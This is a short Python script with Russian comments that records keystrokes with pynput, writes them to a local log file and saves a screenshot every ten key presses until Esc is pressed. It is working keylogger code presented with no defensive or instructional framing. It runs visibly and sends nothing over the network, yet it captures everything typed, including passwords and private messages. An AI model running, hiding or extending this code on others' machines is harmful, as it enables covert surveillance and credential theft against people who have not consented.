"""
Сохраняет нажатия клавиш в файл и делает скриншот экрана
"""
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time


def on_press(key):
    global count, keys
    count += 1
    print("{0} нажата".format(key))
    keys.append(key)

    while count >= 10:
        count = 0
        im = ImageGrab.grab()
        im.save(time.strftime("%m-%d|%H:%M:%S") + '.png')
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path, "a", encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)
            elif k.find("enter") > 0:
                file.write("\n")


def on_release(key):
    if key == Key.esc:
        print("Сохранено в файл")
        return False


file_path = "log.txt"
count = 0
keys = []
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
